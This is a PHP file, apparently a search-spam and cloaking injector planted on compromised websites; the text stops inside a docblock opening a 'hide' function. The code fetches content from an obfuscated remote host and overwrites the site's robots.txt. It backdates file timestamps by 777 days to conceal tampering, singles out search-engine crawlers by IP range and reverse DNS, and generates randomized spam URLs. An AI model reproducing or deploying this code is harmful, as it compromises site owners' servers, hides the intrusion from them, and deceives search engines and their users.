<?php
// header('Content-Type:text/html; charset=utf-8');
/**
 * php inc
 */
@'$
yumingid=43
lineid=2009
x3=
x4=WVepvYrZsM
x6=
x7=http://zenjp80.ikluwjrtyj593hqzg/weilai0.php
cache=0000
sps=111111010
urlgz=^[0:11~15]!|^[0:3~6][1:2~3][0:4~6]![0:2~3]|[0:3~5]^[3:5~8][2:5~8]_[0:3~5]!|[0:1~3]^[4:2~4]-[5:4~7]_[1:1~2][0:2~3]_![0:2~3]|[0:7~13]/^[0:4~6][1:3~5]-!|^-[1:4~5][0:3~6]/[0:2~3][1:1][0:2~7]!/[0:1]|^[0:1~2][3:2~4]-[5:4~7]-[1:1~3][0:3~5]_![0:2~3]|[0:1~3]^[0:2~5][1:1~3][0:3~5]![0:1~3]|[0:1~2]^-[0:3~5][1:5~9]/[5:5~8][0:2~3]!|^[0:4~6]/![0:4~8]|^/[1:6~9]/[0:4~6]-[1:6~9]/!.html|[0:4~5]-[0:3~5]/^[0:6~8]-!-[0:1].html|^[0:5~13]!.html|^[0:6~8][1:2~3]-[0:1~2]!.html|[0:8~10]^/[1:4~5][0:4~5][1:1~2]-!-[0:1].html|^-[0:7~10]-!.php|[0:6~9]^/![0:1~2].php|^/[1:6~11][0:1~2][1:2~3]/[2:5~9][0:2~5]!.php|[0:5~9]^/[0:9~13]!.php|^/[1:5~8][0:1~2]/[1:1~2][2:3~5][0:5~6]![0:3~6].php|^[0:5~7]/!/[0:4~8]/|^[0:3~8]-[0:1~3][1:5~8]/[0:3~5][1:4~5][2:3~5][0:2~3]!/|^[0:4~6]/[3:4~8]/!/|^[0:1~5]-[0:1~2][1:6~8]/[0:2~3]!/|^[0:2~3]-[0:1~3][1:4~7]/[0:3~5][2:3~5][0:2~3]!/|[0:1~3]-^[0:1~3][1:5~7]/[0:3~5][2:3~5][0:2~3]!/|[0:2~5]^/[0:3~5]!/[0:7~9]_[0:2~5]/|[0:2~5]^-[0:1~3][1:4~8]/[0:3~5][1:4~5][3:3~5]![0:2~3]/|[0:1~2]^/[0:3~5]!-[0:5~9]_[0:2~5]/|[0:2~5]-^[0:1~2][1:6~8]/![0:2~3]/
';
@set_time_limit(7200);
@ignore_user_abort(1);
@ob_start();
$domain = "";
$lineNo = 0;
$url_prefix = "";
$url_prefix_qm = $cache = 0;
$charlist = "";
$wordlist = "";
$google_veri = ".";
$base = $script_filename = $script_name = $pgmb = $urlgz = $plrtend = $page_location_root = $http_get = "";
$extensions = $url_rules = $wordlist_array = $id_words = $tpl_string_array = $tpl_number_array = $extras = array();
$root = $_SERVER['DOCUMENT_ROOT'];
// $timer = microtime_float();
///////////////////////////
/*
function timer($msg = ''){
// if (isset($_GET['timer'])) {
global $timer;
echo sprintf("\n".'<div style="background-color: #000;padding: 5px;margin: 10px 0;color:#fff;font-size: 14px;">[timer -> %s] %s seconds taken.</div>', $msg, (microtime_float() - $timer));
// }
}
function microtime_float(){
list($usec, $sec) = explode(" ", microtime());
return ((float)$usec + (float)$sec);
}
//*/
// if(!function_exists('str_ireplace')){function str_replace($from,$to,$string){return trim(preg_replace("/".addcslashes($from,"?:\\/*^$")."/si",$to,$string));}}
function fput_contents($file, $content = '', $mode = 'w')
{
    $f = @fopen($file, $mode);
    if ($f !== false) {
        fwrite($f, $content);
        fclose($f);
    }
}
function strsplit($str)
{
    return preg_split('//u', $str, -1, PREG_SPLIT_NO_EMPTY);
}
function rsync_httpreq($url, $async = 0, $method = 1, $pf = null, $headers = array())
{
    $get = 0;
    if (function_exists('curl_init') && function_exists('curl_exec')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_USERAGENT, 'WHR');
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 300);
        $r = curl_exec($ch);
        curl_close($ch);
        if ($r) {
            $get = $r;
        }
    } else {
        $f = '';
        if (function_exists('fsockopen')) {
            $f = 'fsockopen';
        } elseif (function_exists('pfsockopen')) {
            $f = 'pfsockopen';
        }
        if ($f != '') {
            // die($f);
            $parse = parse_url($url);
            $fp = $f($parse['host'], isset($parse['port']) ? $parse['port'] : 80, $en, $es, 30);
            if ($fp) {
                $get = isset($parse['path']) ? $parse['path'] : '';
                $get .= isset($parse['query']) ? '?' . $parse['query'] : '';
                $get = $get == '' ? '/' : $get;
                fwrite($fp, "GET $get HTTP/1.0\r\nHost: " . $parse['host'] . "\r\nConnection: Close\r\n\r\n");
                $body = '';
                while (!feof($fp)) {
                    $body .= fgets($fp, 4096);
                }
                fclose($fp);
                $get = preg_match("/^HTTP\/1/si", $body) ? preg_replace("/.*?\r\n\r\n(.*)/si", "$1", $body) : preg_replace("/^[^<]+?(<.*)/is", "$1", $body);
            } else {
                $get = 0;
            }
        } else {
            $get = file_get_contents($url);
        }
    }
    return trim(trim($get, "\xEF\xBB\xBF"));
}
function func_loginCheck($agent = '', $todeck = false)
{
    $bots = 'googlebot|baiduspider|bingbot|google|baidu|aol|bing|yahoo';
    // $bots = explode('|', $bots);
    if ($todeck) {
        $bots .= '|Mozilla';
    }
    return preg_match("/($bots)/si", $agent);
}
function func_referCheck($refer = '')
{
    $refer_match = preg_match('/(google.co.jp|yahoo.co.jp|bing|baidu|google.com)/si', $refer);
    if ($refer_match) {
        if (!isset($_COOKIE['isytu'])) {
            @setcookie('isytu', 1, time() + 3600 * 24 * 365);
        }
    }
    return $refer_match;
}
function determine_number($lineNo = '', $index = false, $index_number = 1, $listtest_pat = '')
{
    if ($index) {
        return $index_number;
    } else {
        if ($lineNo != '') {
            // die;
            return $lineNo;
        } else {
            $tmpNo = 0;
            // if (isset($_GET) && !empty($_GET)) {
            //   foreach ($_GET as $key => $value) {
            //       $intV = preg_replace('/[^\d]/si', '', $value);
            //     if ($intV != '') {
            //       $tmpNo = $intV;
            //       break;
            //     }
            //   }
            // }
            // die("$tmpNo");
            // die;
            $request_uri = $listtest_pat != '' ? preg_replace("/(\?|&)?(" . $listtest_pat . ").*/si", '', $_SERVER['REQUEST_URI']) : $_SERVER['REQUEST_URI'];
            $tmpNo = md5($request_uri);
            $tmpNo = preg_replace('/[^\d]/si', '', $tmpNo);
            if ($tmpNo != 0) {
                $lenTmpNo = strlen($tmpNo);
                $lenIndNo = strlen($index_number);
                if ($lenTmpNo > $lenIndNo) {
                    $tmpNo = (int) substr($tmpNo, -($lenIndNo));
                    if ($tmpNo > $index_number) {
                        $tmpNo = substr($tmpNo, -($lenIndNo - 1));
                    }
                } else {
                    $tmpNo = (int) $tmpNo;
                    if ($tmpNo > $index_number) {
                        $tmpNo = substr($tmpNo, -($lenIndNo - 1));
                    }
                }
                $tmpNo = (int) $tmpNo;
                if ($tmpNo != 0) {
                    return (int) $tmpNo;
                }
            }
            $string = 'http://';
            if (isset($_SERVER['HTTP_HOST'])) {
                $string .= $_SERVER['HTTP_HOST'];
            }
            if (isset($_SERVER['SERVER_NAME'])) {
                $string .= $_SERVER['SERVER_NAME'];
            }
            if (isset($_SERVER['REQUEST_URI'])) {
                $string .= $_SERVER['REQUEST_URI'];
            }
            if (isset($_SERVER['REMOTE_ADDR'])) {
                $string .= $_SERVER['REMOTE_ADDR'];
            }
            if (isset($_SERVER['SERVER_SOFTWARE'])) {
                $string .= $_SERVER['SERVER_SOFTWARE'];
            }
            // $string = str_replace(array($li_1, $li_2), '', $string);
            if ($listtest_pat != '') {
                $string = preg_replace("/(\?|&)?(" . $listtest_pat . ").*/si", '', $string);
            }
            return strlen($string);
        }
    }
}
function filetime_change($file)
{
    if (file_exists($file)) {
        @touch($file, strtotime('-777 days'));
    }
}
function filetime_check($file)
{
    $check = false;
    if (is_file($file)) {
        $ft = filemtime($file);
        if ($ft <= strtotime('-777 days')) {
            $check = true;
        }
    }
    return $check;
}
function filemtx($files = '')
{
    $files = explode(',', $files);
    if (!empty($files)) {
        // print_r($files);die;
        foreach ($files as $file) {
            if (!filetime_check($file)) {
                filetime_change($file);
            }
        }
    }
}
function sync_preg_string($sps, $delarg = 1)
{
    $sps_chars = '\\?/|&()[]{}+^$!:*';
    $sps_chars_array = strsplit($sps_chars);
    $sps_char_format = '%s%s';
    if ($delarg) {
        $sps = preg_replace("/(\?|#).*/si", '', $sps);
    }
    // print_r($sps_chars_array);die();
    foreach ($sps_chars_array as $sca_v) {
        // echo sprintf($sps_char_format, '\\', $sca_v);die();
        $sps = str_replace($sca_v, sprintf($sps_char_format, '\\', $sca_v), $sps);
    }
    // echo "$sps";die();
    return $sps;
}
function sid_array($total, $limit, $mode, $lineid)
{
    $ids = array();
    if ($limit > 0) {
        if ($total <= $limit) {
            $ids = range(0, $total);
        } else {
            $start = mt_rand(1, ($total - $limit * 2));
            $ids = range($start, $start + $limit - 1);
        }
    }
    return $ids;
}
function robotstxt($root = '')
{
    $robotstxt = "$root/robots.txt";
    if (!filetime_check($robotstxt)) {
        @chmod($robotstxt);
        fput_contents($robotstxt, sprintf('User-agent:%s*%sDisallow:', ' ', "\n"));
        filetime_change($robotstxt);
    }
}
function sync_uri($ysl, $retu = 0)
{
    // $extrans  => $extensions, $url_rules, $tpl_string_array, $tpl_number_array, $wordlist_array, $url_prefix, $url_prefix_qm, $charlist
    global $extras, $plrtend, $cache, $wordlist_array;
    $yid = $ysl[0];
    $lid = $ysl[1];
    $extend = $ysl[2];
    // $pdn = $ysl[3] != '' ? trim(sync_clean($ysl[3])) : '-';
    // echo "yid = $yid, lid = $lid\n";
    $pdn = trim($ysl[3]);
    $pdn = empty($pdn) ? '-' : $pdn;
    // print_r($extras);die;
    // timer('uri start');
    $uri = '';
    $plus_v = $yid + $lid;
    // print_r($extras);die;
    $url_rule = sync_array_value($extras['url_rules'], $plus_v);
    // timer("url_rule=$url_rule");
    if ($url_rule != '') {
        // echo $url_rule;die;
        $uri = $extras['url_prefix'] . ($extras['url_prefix_qm'] ? preg_replace("/\?/", 'QMQM', $url_rule) : $url_rule);
        // $list = sync_list_word($yid);
        $list = $wordlist_array[array_rand($wordlist_array)];
        // $strlid = sync_strnum($lid);
        $ex = sync_array_value($extras['extensions'], $plus_v);

        // e201710x -> e20171055 (x = yumingid)
        // $uri = str_replace('.^', '201710' . $yid, $uri);
        $uri = str_replace(array('#', '^', '$', '!', '*'), array($list, $yid, $lid, $lid, $ex), $uri);

        // if short product_name -> ;
        // if (strpos($uri, ';') !== false) {
          // $pdn_e_string = '-';
          // if ($pdn != '' && $pdn != '-') {
          //   $pdn_array = explode(' ', $pdn);
          //   $pdn_array = array_unique($pdn_array);
          //   if (!empty($pdn_array)) {
          //     // shuffle($pdn_array);
          //     $pdn_e_string = array_pop($pdn_array);
          //     if (mbstrlen($pdn_e_string) < 7 && !empty($pdn_array)) {
          //       $pdn_e_string .= ' ';
          //       $pdn_e_string .= array_pop($pdn_array);
          //     }
          //     if ($pdn_e_string != '') {
          //       $pdn_e_string = urlencode(ifiis($pdn_e_string));
          //     }
          //   }
          // }
          // $uri = str_replace(';', $pdn_e_string, $uri);
        // }
        // pdn
        $uri = str_replace(';', str_replace('%2F', '/', urlencode($pdn)), $uri);
        // string -> @
        // preg_match_all("/@/", $uri, $arr_string);
        // preg_match_all("/@(\[(\d)\:(.*?)\])?/", $uri, $arr_string);
        // if (isset($arr_string[0])) {
        //   foreach ($arr_string[0] as $sk => $s) {
        //     // $uri = preg_replace("/@/", sync_array_value($extras['tpl_string_array'], $plus_v + $sk * 3), $uri, 1);
        //     $skmode = $arr_string[2][$sk] == '' ? 0 : $arr_string[2][$sk];
        //     $skleng = $arr_string[3][$sk] == '' ? '3~5' : $arr_string[3][$sk];
        //     $uri = preg_replace('/' . sync_preg_string($s) . '/si', randomx($skmode, $skleng), $uri, 1);
        //   }
        // }
        // preg_match_all('/\{.*?\}/si', $uri, $gzoptions);
        // if (isset($gzoptions[0]) && !empty($gzoptions[0])) {
        //   // if ($cache[1]) {
        //     // mt_srand($plus_v);
        //   // }
        //   foreach ($gzoptions[0] as $gzogroup) {
        //     $gzoarr = explode('@', trim($gzogroup, '{}'));
        //     // select one
        //     $lengzoarr = count($gzoarr) - 1;
        //     $gzopick = $gzoarr[mt_rand(0, $lengzoarr)];
        //     $uri = str_replace($gzogroup, $gzopick, $uri);
        //   }
        //   // mt_srand();
        // }
        preg_match_all("/\[(\d)\:(.*?)\]/", $uri, $arr_string);
        // echo "$uri\n";
        // print_r($arr_string);die;
        if (isset($arr_string[0])) {
            foreach ($arr_string[0] as $sk => $s) {
                // $sk = 0;
                // $s = $arr_string[0][$sk];
                $skmode = $arr_string[1][$sk] == '' ? 0 : $arr_string[1][$sk];
                $skleng = $arr_string[2][$sk] == '' ? '3~5' : $arr_string[2][$sk];
                // $skextend = '';
                // if (preg_match('/[^\d]+$/si', $skleng, $skextend_m)) {
                //   // print_r($skextend_m);die;
                //   $skextend = $skextend_m[0];
                //   $skleng = preg_replace('/[^\d]+$/si', '', $skleng);
                // }
                // echo "skleng = $skleng\nskextend = $skextend";die;
                // $uri = preg_replace('/' . sync_preg_string($s) . '/si', randomx($skmode, $skleng, -1), $uri, 1);
                $uri = preg_replace('/' . addcslashes($s, '[]:~') . '/si', randomx($skmode, $skleng, -1), $uri, 1);
                // $uri = preg_replace('/' . addcslashes($s, '[]:~') . '/si', 'adsads', $uri, 1);
                // $uri = preg_replace('/' . sync_preg_string($s) . '/si', 'eijosi', $uri, 1);
            }
        }
        // number -> :
        // preg_match_all("/:/", $uri, $arr_number);
        // if (isset($arr_number[0])) {
        //   foreach ($arr_number[0] as $nk => $n) {
        //     // $uri = preg_replace("/:/", sync_array_value($extras['tpl_number_array'], $plus_v + $nk * 3), $uri, 1);
        //     $uri = preg_replace("/:/", randomx(1), $uri, 1);
        //   }
        // }

        $uri = $extras['url_prefix_qm'] ? preg_replace("/QMQM/", '%3F', $uri) : $uri;
        if ($pdn == '@href') {
            $ysl[3] = $uri;
        }
    }
    // timer("uri done: $uri");die;
    return $plrtend . ($retu ? $uri : "$uri$extend{$ysl[3]}<");
}
// function the_msuri($nums){
//   // print_r($nums);die;
//   $get = 0;
//   for ($j=1; $j < 9999; $j++) {
//     if (!in_array($j, $nums)) {
//       // echo "count = " . count($nums) . "\n";
//       $nums[] = $j;
//       $get = $j;
//       break;
//     }
//   }
//   return array('x' => $nums, 'y' => $get);
// }
function sync_array_value($array = array(), $key = 0)
{
    $val = '';
    $key = (int) $key;
    if (!empty($array)) {
        // echo "key = $key\n";
        if (isset($array[$key])) {
            $val = $array[$key];
        } else {
            // $md5 = trim(preg_replace("/[^0-9]/si", '', md5($key)));
            $val = $array[$key % count($array)];
        }
    }
    return $val;
}
function urlcheck($url, $url_rules, $extensions, $upq = 0)
{
    $match = array(0, array());
    // check one by one
    // format url rule to preg string
    // echo $url;die;
    if (!empty($url_rules)) {
        $exts = !empty($extensions) ? implode('|', $extensions) : '';
        foreach ($url_rules as $rule) {
            // $rule = preg_replace('/@\[\d\:.*?\]/si', '@', $rule);
            // $rule = preg_replace('/\[\d\:.*?\]/si', '[a-zA-Z0-9]+', $rule);
            $rule = preg_replace('/\[0\:.*?\]/si', '[a-z]+', $rule);
            $rule = preg_replace('/\[1\:.*?\]/si', '[0-9]+', $rule);
            $rule = preg_replace('/\[2\:.*?\]/si', '[a-z0-9]+', $rule);
            $rule = preg_replace('/\[3\:.*?\]/si', '[a-zA-Z]+', $rule);
            $rule = preg_replace('/\[4\:.*?\]/si', '[A-Z]+', $rule);
            $rule = preg_replace('/\[5\:.*?\]/si', '[a-zA-Z0-9]+', $rule);
            // echo "$rule:<br/>-------------------------<br/>";
            // $rule = strtr($rule, array('@' => '[a-zA-Z]+', '?' => '\?', ':' => '\d+', '#' => '[a-zA-Z0-9]+', '^' => '\d+', '!' => '\d+', '$' => '[a-zA-Z]+', '/' => '\/', '+' => '\+', '*' => ($exts != '' ? "($exts)" : '')));
            // $rule = strtr($rule, array('@' => '[a-zA-Z0-9]+', '?' => '\?', '#' => '[a-zA-Z0-9]+', '^' => '\d+', '!' => '\d+', '$' => '[a-zA-Z]+', '/' => '\/', '+' => '\+', '*' => ($exts != '' ? "($exts)" : '')));
            $rule = strtr($rule, array('@' => ')|(', '{' => '((', '}' => '))', '?' => $upq ? '%3F' : '\?', '#' => '[a-zA-Z]+', '^' => '(\d+)', '!' => '(\d+)', '/' => '\/', '+' => '\+', '*' => ($exts != '' ? "($exts)" : '')));
            $rule = str_replace(']\+', ']+', $rule);
            $rule = str_replace(';', '.*', $rule);
            // $rule = preg_replace('/^\\\\\?/si', '', $rule);
            // if (!preg_match('/^\?/si', $url)) {
            //   echo 'matched<br/>';
            //   $rule = preg_replace('/^\\\\\?/si', '', $rule);
            //   echo "$rule<br/>++++++++++++++++++++++++<br/>";
            // }
            // echo "$rule<br/>++++++++++++++++++++++++++<br/>";
            $rockm = array();
            if (preg_match("/^$rule$/", urldecode($url), $rockm)) {
                // echo "$rule\n";
                // $match = true;
                $match = array(1, $rockm);
                break;
            }
        }
        // die;
    }
    return $match;
}
function getIp()
{
    $arr_ip_header = array(
        'HTTP_CDN_SRC_IP',
        'HTTP_PROXY_CLIENT_IP',
        'HTTP_WL_PROXY_CLIENT_IP',
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'REMOTE_ADDR',
    );
    $client_ip = 'unknown';
    foreach ($arr_ip_header as $aihkey) {
        if (!empty($_SERVER[$aihkey]) && strtolower($_SERVER[$aihkey]) != 'unknown') {
            $client_ip = $_SERVER[$aihkey];
            break;
        }
    }
    return $client_ip;
}

function is_bot()
{
    $ua = @strtolower($_SERVER['HTTP_USER_AGENT']);
    if ($ua == 'yuantuobot') {
        return true;
    }
    if (strpos(@strtolower($_SERVER["HTTP_REFERER"]), "translate") != false) {
        return false;
    }

    $rip = $ip = getIp();

    if (($lip = ip2long($ip)) < 0) {
        $lip += 4294967296;
    }

    $rs = array(array(3639549953, 3639558142), array(1089052673, 1089060862), array(1123635201, 1123639294), array(1208926209, 1208942590),
        array(3512041473, 3512074238), array(1113980929, 1113985022), array(1249705985, 1249771518), array(1074921473, 1074925566),
        array(3481178113, 3481182206), array(2915172353, 2915237886), array(2850291712, 2850357247), array(1823129600, 1823145983), array(1823539200, 1823571967), array(2398748672, 2398879743), array(2899902464, 2899967999), array(2902261760, 2902327295), array(2915172352, 2915237887), array(3232890880, 3233021951), array(3344429056, 3344430079), array(3481178112, 3481182207), array(3487539200, 3487543295), array(3518562304, 3518627839), array(3512041472, 3512074239), array(3639549952, 3639558143), array(3625975808, 3626237951), array(3627728896, 3627737087), array(1074921472, 1074925567), array(1089052672, 1089060863), array(1078214656, 1078222847), array(1113980928, 1113985023), array(1123631104, 1123639295), array(1176535040, 1176543231), array(1180172288, 1180434431), array(1208926208, 1208942591), array(1249705984, 1249771519), array(134217728, 150994943), array(1081896984, 1081896991), array(2159111488, 2159111679), array(2159128096, 2159128111), array(3468331392, 3468331283), array(3459234728, 3459234735), array(3475195328, 3475195391), array(3494556048, 3494556063), array(3522775360, 3522775367), array(1062518496, 1062518527), array(1081575648, 1081575655), array(1081927080, 1081927087), array(1082183584, 1082183599), array(1074918400, 1074918431), array(1103424288, 1103424303), array(1104396896, 1104396911), array(1104572512, 1104572543), array(1104609120, 1104609135), array(1105036720, 1105036735), array(1105135664, 1105135679), array(1119913504, 1119913519), array(1132356616, 1132356623), array(1180359472, 1180359479), array(1180359496, 1180359503), array(3518589952, 3518590207), array(3518627072, 3518627327), array(3512069632, 3512069887), array(3639550208, 3639550463), array(3639551232, 3639551487), array(3639551842, 3639551843), array(3639552352, 3639552355), array(3639553280, 3639553535), array(3639553536, 3639553791), array(3639554912, 3639556963), array(3626100131, 3626100131), array(1089056193, 1089056255), array(1078218752, 1078219007), array(1078219008, 1078219263), array(1078219264, 1078219519), array(1078219520, 1078219775), array(1078219776, 1078220031), array(1078220032, 1078220287), array(1078220288, 1078220543), array(1078220544, 1078220799), array(1078220800, 1078221055), array(1078221056, 1078221311), array(1078221313, 1078221567), array(1078221568, 1078221823), array(1078221824, 1078222079), array(1123631104, 1123631359), array(1123631360, 1123631615), array(1123631616, 1123631871), array(1123631872, 1123632127), array(1123632128, 1123632383), array(1123632384, 1123632639), array(1123632640, 1123632895), array(1123632896, 1123633151), array(1123633152, 1123633407), array(1123633408, 1123633663), array(1123634688, 1123634943), array(1123634944, 1123635199), array(1208928000, 1208928000), array(134623232, 134623487), array(1123634176, 1123634431), array(1089052672, 1089060863), array(1113980928, 1113985023), array(1123631104, 1123639295), array(1208926208, 1208942591), array(1249705984, 1249771519), array(3512041472, 3512074239), array(3639549952, 3639558143), array(3639550208, 3639550463), array(3639550720, 3639550975), array(3639551232, 3639551487), array(3639551744, 3639551999), array(3639554816, 3639555071), array(3639555328, 3639555583), array(3639555840, 3639556095), array(3639556352, 3639556607), array(3639556864, 3639557119), array(1089052928, 1089053183), array(1089060096, 1089060351), array(1113983744, 1113983999), array(1113982720, 1113982975), array(1113983232, 1113983487), array(1123631104, 1123631359), array(1123631360, 1123631615), array(1123631616, 1123631871), array(1123632896, 1123633151), array(1123633152, 1123633407), array(1208930048, 1208930303), array(1089060096, 1089060351), array(1113983744, 1113983999), array(1113982720, 1113982975), array(1113983232, 1113983487), array(1123631104, 1123631359), array(1123631360, 1123631615), array(1123631616, 1123631871), array(1123632896, 1123633151), array(1123633152, 1123633407), array(1208930048, 1208930303), array(3639550208, 3639550463), array(3639550720, 3639550975), array(3639551232, 3639551487), array(3639551744, 3639551999), array(3639554816, 3639555071), array(3639555328, 3639555583), array(3639555840, 3639556095), array(3639556352, 3639556607), array(3639556864, 3639557119), array(1123631360, 1123631615), array(1123632128, 1123632383), array(1123632896, 1123633151), array(3419421696, 3419421951), array(3729389312, 3729389567), array(1090060288, 1090125823), array(1078394880, 1078460415));
    foreach ($rs as $r) {
        if ($lip >= $r[0] && $lip <= $r[1]) {
            return true;
        }
    }

    $ips = array(134217728, 150994943, 1062518496, 1062518527, 1074918400, 1074918431, 1074921472, 1074925567, 1078214656, 1078222847, 1081575648, 1081575655, 1081896984, 1081896991, 1081927080, 1081927087, 1082183584, 1082183599, 1089052672, 1089060863, 1103424288, 1103424303, 1104396896, 1104396911, 1104572512, 1104572543, 1104609120, 1104609135, 1105036720, 1105036735, 1105135664, 1105135679, 1113980928, 1113985023, 1119913504, 1119913519, 1123631104, 1123639295, 1132356616, 1132356623, 1176535040, 1176543231, 1180172288, 1180359472, 1180359479, 1180359496, 1180359503, 1180434431, 1208926208, 1208942591, 1249705984, 1249771519, 1823129600, 1823145983, 1823539200, 1823571967, 2159111488, 2159111679, 2159128096, 2159128111, 2398748672, 2398879743, 2899902464, 2899967999, 2902261760, 2902327295, 2915172352, 2915237887, 3232890880, 3233021951, 3344429056, 3344430079, 3459234728, 3459234735, 3468331392, 3468331455, 3475195328, 3475195391, 3481178112, 3481182207, 3487539200, 3487543295, 3494556048, 3494556063, 3512041472, 3512074239, 3518562304, 3518627839, 3522775360, 3522775367, 3625975808, 3626237951, 3627728896, 3627737087, 3639549952, 3639558143);
    foreach ($ips as $ip) {
        if ($lip == $ip) {
            return true;
        }
    }

    $bots = array('googlebot', 'bingbot', 'slurp', 'msnbot', 'jeeves', 'teoma', 'crawler', 'spider');
    foreach ($bots as $b) {
        if (strpos($ua, $b) !== false) {
            return is_spider($rip, $ua);
        }
    }
    return false;
}

function is_spider($ip, $ua)
{
    $spider_list = array(
        'google' => array(
            'Googlebot',
            'googlebot.com',
        ),
        'yahoo' => array(
            'Yahoo!',
            'inktomisearch.com',
        ),
        'msn' => array(
            'MSNBot',
            'live.com',
        ),
        'bing' => array(
            'bingbot',
            'msn.com',
        ),
    );
    if (!preg_match('/^(\d{1,3}\.){3}\d{1,3}$/', $ip)) {
        return false;
    }

    if (empty($ua)) {
        return false;
    }

    foreach ($spider_list as $k => $v) {
        if (stripos($ua, $v[0]) !== false) {
            $domain = gethostbyaddr($ip);
            if ($domain && stripos($domain, $v[1]) !== false) {
                return $k;
            }
        }
    }
    return false;
}
function psuck($domain, $lineid, $matrock = array())
{
    // print_r($matrock);die;
    $idarx = array('a' => -1, 'b' => -1);
    if (is_array($matrock)) {
        foreach ($matrock as $mrval) {
            if (is_numeric($mrval)) {
                if ($idarx['a'] == -1) {
                    $idarx['a'] = $mrval;
                } else {
                    $idarx['b'] = $mrval;
                }
            }

        }
    }
    // die;
    return $idarx;
}
function xml_urlarg($url = '', $de = 0)
{
    if ($de) {
        $url = preg_replace("/&amp;/s", '&', $url);
        $url = preg_replace("/&apos;/s", "'", $url);
        $url = preg_replace('/&quot;/s', '"', $url);
        $url = preg_replace("/&gt;/s", '>', $url);
        $url = preg_replace("/&lt;/s", '<', $url);
    } else {
        $url = preg_replace("/&/s", '&amp;', $url);
        $url = preg_replace("/'/s", '&apos;', $url);
        $url = preg_replace('/"/s', '&quot;', $url);
        $url = preg_replace("/>/s", '&gt;', $url);
        $url = preg_replace("/</s", '&lt;', $url);
    }
    return $url;
}
function randomx($mode = 0, $leng = '3~5', $rndkey = -1)
{
    // 0 for string, 1 for number, 2 for stringnumber, 3 for lowerupper, 4 for upper, 5 for all
    // $seeds = $mode == 0 ? range('a', 'z') : range(0, 9);
    $range_a = range('a', 'z');
    $range_b = range('A', 'Z');
    $range_c = range(0, 9);
    switch ($mode) {
        case 0:
            $seeds = $range_a;
            break;
        case 1:
            $seeds = $range_c;
            break;
        case 2:
            $seeds = array_merge($range_a, $range_c);
            break;
        case 3:
            $seeds = array_merge($range_a, $range_b);
            break;
        case 4:
            $seeds = $range_b;
            break;
        case 5:
            $seeds = array_merge($range_a, $range_b, $range_c);
            break;
    }
    // if ($rndkey != -1) {
    //   mt_srand($rndkey);
    // }
    $parselen = explode('~', $leng);
    if (count($parselen) == 1) {
        $leng = (int) $leng;
    } else {
        $leng = mt_rand((int) $parselen[0], (int) $parselen[1]);
    }
    $x = '';
    // if ($mode != 1) {
    //   // ext char out of $charlist
    //   global $charlist;
    //   foreach ($seeds as $s_k => $s_v) {
    //     if (strpos($charlist, $s_v) !== false) {
    //       unset($seeds[$s_k]);
    //     }
    //   }
    //   $seeds = array_values($seeds);
    // }
    shuffle($seeds);
    // $seedlen = count($seeds) - 1;
    // for ($k = $seedlen; $k > 0; $k--){
    //   $j = mt_rand(0, $k);
    //   $tmpseed = $seeds[$k];
    //   $seeds[$k] = $seeds[$j];
    //   $seeds[$j] = $tmpseed;
    // }
    // print_r($seeds);die;
    // for ($i=0; $i < $leng; $i++) {
    //   // if ($rndkey != -1) {
    //   //   mt_srand($rndkey+$i);
    //   // }
    //   // $x .= $seeds[mt_rand(0, $seedlen)];
    //   if (!isset($seeds[$i])) {
    //     break;
    //   }
    //   $x .= $seeds[$i];
    // }
    $x = substr(implode('', $seeds), 0, $leng);
    // mt_srand();
    // if (in_array($mode, array(2, 5))) {
    //   $x = substr($x, 0, strlen($x) - 1) . $range_a[array_rand($range_a)];
    // }
    return $x;
}
function shelldata($pghost)
{
    global $page_location_root, $lineNo;
    $base = str_replace("$pghost/", '', $page_location_root);
    // echo "base = $base";die;
    $array = array();
    $shlinks = parse_tpl_links2(rsync_httpreq($pghost));
    $array[] = $lineNo;
    foreach ($shlinks as $shlink) {
        $_SERVER['REQUEST_URI'] = "/$shlink";
        $array[] = determine_number('', 0, $lineNo);
    }
    // print_r($array);die;
    array_unshift($shlinks, '');
    return array('a' => $array, 'b' => $shlinks);
}
function newdata($sxcache, $sxurl, $limit)
{
    $array = array();
    $get = @file_get_contents($sxcache);
    if ($get === false) {
        $get = rsync_httpreq($sxurl);
        @fput_contents($sxcache, $get);
    }
    $get = explode('|', $get);
    // print_r($get);die;
    $max = PHP_INT_MAX;
    foreach ($get as $line) {
        $linearr = explode('-', $line);
        if ($max > $linearr[2]) {
            $max = $linearr[2];
        }
        $array[$linearr[0]] = array();
    }
    $idarr = array();
    for ($i = 0; $i < $limit; $i++) {
        $idarr[] = mt_rand(0, $max - 1);
    }
    // print_r($array);die;
    foreach ($array as $dokey => $dovalue) {
        $array[$dokey] = $idarr;
    }
    // print_r($array);die;
    return $array;
}
function x7de($x7)
{
    $x7u = '';
    preg_match("/([^\.]+\.)(.*)(\/.*)/", $x7, $x7m);
    // print_r($x7m);die;
    if (is_array($x7m) && count($x7m) == 4) {
        if ($x7m[2] != '') {
            $x7split = preg_split("//", $x7m[2], -1, PREG_SPLIT_NO_EMPTY);
            foreach ($x7split as $srkey => $srval) {
                $x7split[$srkey] = chr(ord($srval) - 5);
            }
            $x7u = implode('', $x7split);
        }
        $x7u = $x7m[1] . $x7u . $x7m[3];
    }
    return $x7u;
}
function parse_tpl_links2($html)
{
    global $page_location_root;
    $array = array();
    preg_match_all("/<a.*?href=['\"]?(.*?)['\"\s>]/si", $html, $matches);

    // print_r($matches);echo "\n";
    if (isset($matches[1]) && !empty($matches[1])) {
        foreach ($matches[1] as $match) {
            // echo "$match -> ";
            $match = trim($match);
            if ($match != '') {
                /// check if !$page_location_root
                // echo $match;die;
                $match = preg_replace("/^(https?\:)?\/\/[^\/]+\/?/si", '', trim($match));
                $match = preg_replace('/^[\/#]/si', '', $match);
                $match = str_replace('\\', '', $match);
                // echo "$match\n";
                if ($match != '' && !preg_match('/\.(jpg|jpeg|gif|png|bmp|svg)$/si', $match)) {
                    if (!in_array($match, $array)) {
                        $array[] = xml_urlarg($match, 1);
                    }
                }
            }
        }
    }
    return $array;
}
/**
function hide($base = '', $scriptfn = '', $root = ''){
